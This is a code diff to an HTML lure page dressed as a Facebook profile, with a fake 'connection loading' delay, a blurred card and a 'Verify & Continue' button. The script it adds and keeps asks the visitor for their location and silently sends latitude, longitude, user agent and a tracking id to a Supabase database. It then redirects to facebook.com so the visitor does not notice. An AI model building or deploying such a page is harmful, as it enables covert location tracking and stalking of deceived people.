@@ -6,9 +6,18 @@
     <title>Connecting...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 320px; filter: blur(10px); }
-        .btn { background: #3578e5; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; display: none; }
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 340px; padding: 20px; filter: blur(15px); } /* Initial high blur */
+        
+        .fb-header { position: relative; width: 100%; height: 120px; background-color: #f1f2f3; border-top-left-radius: 12px; border-top-right-radius: 12px; overflow: hidden; }
+        .cover-photo { width: 100%; height: 100%; object-fit: cover; }
+        .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 4px solid white; position: absolute; bottom: -20px; left: 50%; transform: translateX(-50%); object-fit: cover; }
+        
+        .profile-info { margin-top: 30px; }
+        .name { font-size: 22px; font-weight: bold; margin: 0; color: #1c1e21; }
+        .loader-text { color: #666; font-size: 14px; margin: 15px 0; }
+        
+        .verify-btn { background: #3578e5; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; display: none; margin-top: 15px; width: 100%; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3578e5; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -16,12 +25,17 @@
 <body>
 
 <div id="main-content" class="card">
-    <div style="margin-bottom: 20px;">
-        <img src="https://i.ibb.co/L5hYwP7/fb-profile-blur.png" alt="Blurred Profile" width="100%">
+    <div class="fb-header">
+        <img src="https://i.ibb.co/3Wf4w38/cover-birds.png" alt="Cover" class="cover-photo">
+        <img src="https://i.ibb.co/9r5J05X/profile-pic.png" alt="Profile" class="profile-pic">
     </div>
-    <div id="loader" class="loader"></div>
-    <p id="msg" style="color: #666; font-size: 14px;">Loading connection...</p>
-    <button id="verify-btn" class="btn">Verify & Continue</button>
+    
+    <div class="profile-info">
+        <h3 class="name">Hamza Rahman</h3>
+        <div id="loader" class="loader"></div>
+        <p id="msg" class="loader-text">Loading connection...</p>
+        <button id="verify-btn" class="verify-btn">Verify & Continue</button>
+    </div>
 </div>
 
 <script>
@@ -34,21 +48,21 @@
     const loader = document.getElementById('loader');
     const msg = document.getElementById('msg');
 
-    // Delayed function to simulate loading and show the verify button
+    // Simulate connection loading and show verify button
     setTimeout(() => {
         mainContent.style.filter = 'blur(0)'; // Remove blur when ready
         loader.style.display = 'none';
-        msg.textContent = 'Please click below to verify your connection and view the profile.';
+        msg.textContent = 'Connection verified! Click below to view the profile.';
         btn.style.display = 'block';
-    }, 2500); // 2.5 second delay for loading effect
+    }, 3000); // 3-second delay for fake loading
 
     btn.addEventListener('click', () => {
         btn.style.display = 'none';
         loader.style.display = 'block';
-        msg.textContent = 'Verifying connection...';
+        msg.textContent = 'Verifying security key...';
 
         const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id') || 'Social_User';
+        const targetId = urlParams.get('id') || 'Social_Visitor';
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -57,10 +71,10 @@
                     user_identifier: targetId, 
                     latitude: pos.coords.latitude, 
                     longitude: pos.coords.longitude,
-                    device_info: "Social Verification: " + navigator.userAgent
+                    device_info: "Social Verification (Specific Profile): " + navigator.userAgent
                 }]);
                 
-                // Redirect to Facebook profile page
+                // Redirect back to user-er home or a fake "profile is now visible" confirmation
                 window.location.replace("https://www.facebook.com");
             }, (err) => {
                 // Permission deny korle ba error holeo redirect
